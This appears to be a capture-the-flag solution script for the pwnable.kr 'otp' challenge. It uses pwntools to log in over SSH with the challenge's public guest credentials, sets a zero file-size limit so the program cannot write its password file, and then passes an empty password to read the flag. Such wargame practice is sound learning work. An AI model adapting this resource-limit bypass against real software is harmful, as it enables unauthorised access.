from pwn import *
#ulimit -f 0
context.log_level = "debug"
io=ssh(host='pwnable.kr',user='otp',password='guest',port=2222)
sh = io.process('/bin/sh')
sh.sendline('ulimit -f 0')
sh.sendline("./otp ''")
sh.recvall()
io.interactive()
